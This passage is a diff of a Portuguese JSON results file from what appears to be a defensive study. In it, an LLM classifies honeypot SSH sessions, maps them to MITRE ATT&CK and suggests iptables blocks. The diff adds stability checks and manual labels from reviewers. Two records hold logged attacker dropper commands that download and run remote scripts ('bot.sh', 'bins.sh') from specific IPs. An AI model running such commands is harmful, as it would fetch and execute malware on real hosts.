@@ -45,7 +45,8 @@
       "tempo_segundos": 1.13,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -72,13 +73,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.13,
+      "execucao_2_tempo_s": 1.88
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,1s a partir de IP listado no IPsum."
     }
   },
   {
@@ -127,7 +151,8 @@
       "tempo_segundos": 1.05,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -154,13 +179,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.05,
+      "execucao_2_tempo_s": 1.07
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,0s a partir de IP listado no IPsum."
     }
   },
   {
@@ -209,7 +257,8 @@
       "tempo_segundos": 3.03,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -236,13 +285,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 3.03,
+      "execucao_2_tempo_s": 1.26
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 0,9s a partir de IP listado no IPsum."
     }
   },
   {
@@ -291,7 +363,8 @@
       "tempo_segundos": 1.11,
       "comandos": [
         "echo xsec"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -318,13 +391,38 @@
     },
     "conferencia_mitre": {
       "status": "PARCIAL",
-      "justificativa": "O comando echo xsec apenas imprime uma string de verificacao pos-login no shell (T1059.004), nao configurando varredura ativa de rede pre-comprometimento (T1595)."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 0,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1059.004 (Unix Shell)"
+      ],
+      "justificativa": "O comando 'echo xsec' ocorre dentro de uma sessão SSH autenticada (T1059.004); o modelo mapeou para T1595 (Active Scanning), que pertence à tática Reconnaissance pré-comprometimento."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.11,
+      "execucao_2_tempo_s": 1.2
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sonda automatizada de verificação de shell ('echo xsec') executada em 0,8s a partir de IP listado no IPsum."
     }
   },
   {
@@ -373,7 +471,8 @@
       "tempo_segundos": 1.09,
       "comandos": [
         "echo xsec"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -400,13 +499,38 @@
     },
     "conferencia_mitre": {
       "status": "PARCIAL",
-      "justificativa": "Criterio uniforme para echo xsec: o comando apenas imprime uma string de teste no shell (T1059.004), nao coletando informacoes do host na fase de reconhecimento (T1592)."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 0,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1059.004 (Unix Shell)"
+      ],
+      "justificativa": "O comando 'echo xsec' apenas imprime uma string de verificação de disponibilidade do shell; o modelo associou a T1592 (Gather Victim Host Information), técnica pré-comprometimento."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.09,
+      "execucao_2_tempo_s": 1.16
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sonda automatizada de verificação de shell ('echo xsec') executada em 1,2s a partir de IP listado no IPsum."
     }
   },
   {
@@ -478,7 +602,8 @@
         "wget http://45.142.214.18/bot.sh",
         "chmod +x bot.sh",
         "./bot.sh"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -516,13 +641,39 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 2,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "rm -f /tmp/bot.sh",
+        "pkill -f bot.sh"
+      ],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.41,
+      "execucao_2_tempo_s": 1.4
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Script dropper automatizado ('cd /tmp; wget .../bot.sh; chmod +x; ./bot.sh') executado em rajada de 1,5s."
     }
   },
   {
@@ -588,7 +739,8 @@
         "cd /tmp",
         "curl -O http://185.220.101.42/bins.sh",
         "sh bins.sh"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -624,13 +776,38 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 2,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "rm -f /tmp/bins.sh"
+      ],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.28,
+      "execucao_2_tempo_s": 1.51
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Script dropper automatizado ('cd /tmp; curl -O .../bins.sh; sh bins.sh') executado em rajada de 1,4s."
     }
   },
   {
@@ -679,7 +856,8 @@
       "tempo_segundos": 1.16,
       "comandos": [
         "cat /proc/cpuinfo"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -706,13 +884,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.16,
+      "execucao_2_tempo_s": 1.04
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de hardware ('cat /proc/cpuinfo') executado em 1,0s a partir de IP listado no IPsum."
     }
   },
   {
@@ -761,7 +962,8 @@
       "tempo_segundos": 1.05,
       "comandos": [
         "uname -a"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -788,13 +990,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.05,
+      "execucao_2_tempo_s": 0.99
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de versão de kernel ('uname -a') executado em 0,7s a partir de IP listado no IPsum."
     }
   },
   {
@@ -843,7 +1068,8 @@
       "tempo_segundos": 1.06,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -870,13 +1096,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.06,
+      "execucao_2_tempo_s": 1.04
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 0,9s a partir de IP listado no IPsum."
     }
   },
   {
@@ -925,7 +1174,8 @@
       "tempo_segundos": 1.08,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -952,13 +1202,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.08,
+      "execucao_2_tempo_s": 1.13
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,1s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1007,7 +1280,8 @@
       "tempo_segundos": 1.09,
       "comandos": [
         "echo xsec"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1034,13 +1308,38 @@
     },
     "conferencia_mitre": {
       "status": "PARCIAL",
-      "justificativa": "Criterio uniforme para echo xsec: o comando imprime string fixa de verificacao (T1059.004) sem consultar dados do sistema operacional (T1082)."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 0,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1059.004 (Unix Shell)"
+      ],
+      "justificativa": "O comando 'echo xsec' não coleta informações do sistema operacional; o mapeamento para T1082 (System Information Discovery) é parcial frente a T1059.004 (Unix Shell)."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.09,
+      "execucao_2_tempo_s": 1.04
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sonda automatizada de verificação de shell ('echo xsec') executada em 0,8s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1089,7 +1388,8 @@
       "tempo_segundos": 1.19,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1116,13 +1416,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.19,
+      "execucao_2_tempo_s": 1.13
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,0s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1171,7 +1494,8 @@
       "tempo_segundos": 0.97,
       "comandos": [
         "cat /proc/cpuinfo"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1198,13 +1522,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 0.97,
+      "execucao_2_tempo_s": 1.07
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de hardware ('cat /proc/cpuinfo') executado em 0,9s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1253,7 +1600,8 @@
       "tempo_segundos": 0.99,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1280,13 +1628,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
